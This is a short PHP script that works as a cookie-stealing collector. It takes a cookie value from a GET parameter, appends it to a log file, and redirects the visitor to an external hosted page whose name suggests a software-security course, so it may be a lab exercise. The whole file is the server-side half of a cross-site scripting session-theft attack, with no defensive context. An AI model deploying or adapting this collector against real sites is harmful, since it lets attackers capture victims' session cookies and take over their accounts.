<?php
header ('Location:https://silke-henderickx-software-security.000webhostapp.com/index.php');

$cookies = $_GET["c"];

$file = fopen('log.txt', 'a');

fwrite($file, $cookies . "\n\n");


?>